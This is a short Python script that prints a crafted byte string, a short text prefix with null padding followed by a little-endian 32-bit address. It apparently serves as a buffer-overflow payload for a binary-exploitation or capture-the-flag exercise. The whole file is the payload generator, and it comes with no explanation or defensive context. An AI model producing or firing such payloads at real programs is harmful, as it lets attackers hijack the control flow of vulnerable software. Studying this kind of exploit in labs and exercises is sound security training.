import sys
sys.stdout.buffer.write(b"araheja" + b"\x00"*3 + b"A+" + 0x08048c1c.to_bytes(4, 'little'))

